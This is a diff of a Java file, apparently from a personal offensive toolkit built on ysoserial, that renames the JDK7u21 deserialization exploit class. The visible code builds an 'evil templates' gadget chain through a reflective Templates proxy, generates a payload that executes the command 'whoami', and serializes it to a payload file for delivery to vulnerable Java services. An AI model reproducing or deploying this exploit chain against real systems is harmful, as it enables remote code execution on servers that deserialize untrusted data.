@@ -246,7 +246,7 @@ class Gadgets {
 
 
 
-public class JDK7u21 {
+public class JDK7u21_m {
 
     public Object buildPayload(final String command) throws Exception {
         // generate evil templates，if we trigger templates.getOutputProperties(), we can execute command
@@ -265,7 +265,7 @@ public class JDK7u21 {
         ctor.setAccessible(true);
         InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);
 //        Reflections.setFieldValue(tempHandler, "type", Templates.class);  // not necessary, because newInstance() already pass Templates.class to tempHandler
-        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);
+        Templates proxy = (Templates) Proxy.newProxyInstance(JDK7u21_m.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);
 
         Reflections.setFieldValue(templates, "_auxClasses", null);
         Reflections.setFieldValue(templates, "_class", null);
@@ -280,7 +280,7 @@ public class JDK7u21 {
 //    mvn install:install-file -Dfile=c:\kaptcha-{version}.jar -DgroupId=com.google.code
 //    		-DartifactId=kaptcha -Dversion={version} -Dpackaging=jar
     public static void main(String[] args) throws Exception {
-        JDK7u21 exploit = new JDK7u21();
+    	ysoserial.payloads.util.JDK7u21_m exploit = new ysoserial.payloads.util.JDK7u21_m();
         Object payload = exploit.buildPayload("whoami");
 //        // test payload
         ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("/Users/0x101/safe/mytools_10012106/myhktools/payload/8848.bin"));
